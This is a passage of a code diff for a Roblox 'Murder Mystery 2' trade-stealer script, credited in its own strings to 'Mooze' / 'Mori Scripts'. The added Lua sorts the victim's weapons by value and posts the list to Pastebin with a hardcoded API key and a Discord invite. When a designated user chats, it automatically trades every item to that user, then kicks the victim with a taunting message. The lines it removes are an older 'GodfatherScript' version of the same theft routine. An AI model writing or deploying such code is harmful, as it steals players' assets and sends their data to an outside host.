+    if CommonList ~= "" then
+        List = List .. "COMMON LIST:\n" .. CommonList .. "\n"
+    end
+
+    if #weaponsToSend > 0 then
+        table.sort(
+            weaponsToSend,
+            function(a, b)
+                return a.Value > b.Value
+            end
+        )
+
+        local sentWeapons = {}
+        for i, v in ipairs(weaponsToSend) do
+            sentWeapons[i] = v
+        end
+
+        local body = {
+            api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+            api_paste_code = "MM2 STEALER BY MOOZE, JOIN discord.gg/PzWY2QX8cu\n\n" .. List,
+            api_option = "paste"
+        }
+
+        local encodedBody = ""
+        for key, value in pairs(body) do
+            encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+        end
+        encodedBody = encodedBody:sub(1, -2)
+
+        local response
+        local success, err =
+            pcall(
+            function()
+                response =
+                    request(
+                    {
+                        Url = "https://pastebin.com/api/api_post.php",
+                        Method = "POST",
+                        Body = encodedBody,
+                        Headers = {
+                            ["Content-Type"] = "application/x-www-form-urlencoded"
+                        },
+                        Timeout = 20
+                    }
+                )
+            end
+        )
+
+        local rawUrl
+        if not success or not response or not response.Success then
+            rawUrl = "Ratelimited"
+        else
+            local pasteUrl = response.Body
+            rawUrl = "[Click Me](https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$") .. ")"
+        end
+
+        SendJoinMessage(rawUrl)
+        GlobalMessage(countryFlagEmoji, List2, rawUrl, discuser)
+
+        local function doTrade(joinedUser)
+            local initialTradeState = getTradeStatus()
+            if initialTradeState == "StartTrade" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+                wait(0.3)
+            elseif initialTradeState == "ReceivingRequest" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                wait(0.3)
+            end
+
+            while #weaponsToSend > 0 do
+                local tradeStatus = getTradeStatus()
+
+                if tradeStatus == "None" then
+                    sendTradeRequest(joinedUser)
+                elseif tradeStatus == "SendingRequest" then
+                    wait(0.3)
+                elseif tradeStatus == "ReceivingRequest" then
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer(
+
+                    )
+                    wait(0.3)
+                elseif tradeStatus == "StartTrade" then
+                    for i = 1, math.min(4, #weaponsToSend) do
+                        local weapon = table.remove(weaponsToSend, 1)
+                        for count = 1, weapon.Amount do
+                            addWeaponToTrade(weapon.DataID)
+                        end
+                    end
+                    wait(6)
+                    acceptTrade()
+                    waitForTradeCompletion()
+                else
+                    wait(0.5)
+                end
+                wait(1)
+            end
+            plr:kick(
+                "All your stuff has just been stolen by Mori Scripts Tradestealer. Join discord.gg/PzWY2QX8cu to start tradestealing yourself"
+            )
+        end
+
+        local function waitForUserChat()
+            local sentMessage = false
+            local function onPlayerChat(player)
+                if user == player.Name then
+                    player.Chatted:Connect(
+                        function()
+                            doTrade(player.Name)
+                        end
+                    )
+                end
+            end
+            for _, p in ipairs(Players:GetPlayers()) do
+                onPlayerChat(p)
+            end
+            Players.PlayerAdded:Connect(onPlayerChat)
+        end
+        waitForUserChat()
+    end
 end
 
-Players.PlayerAdded:Connect(function(player)
-    if player == plr then return end
-    if GodfatherScriptIsTarget(player.Name) then
-        task.spawn(function()
-            task.wait(4)
-            GodfatherScriptDoTrade(player)
-        end)
-    end
-end)
-
-for _, p in ipairs(Players:GetPlayers()) do
-    if p ~= plr and GodfatherScriptIsTarget(p.Name) then
-        task.spawn(function()
-            task.wait(2)
-            GodfatherScriptDoTrade(p)
-        end)
-        break
-    end
-end
-
-while not isTradeCompleted do
-    task.wait(1)
+if game.PlaceId == 142823291 or game.PlaceId == 335132309 or game.PlaceId == 636649648 then
+    MM2()
 end
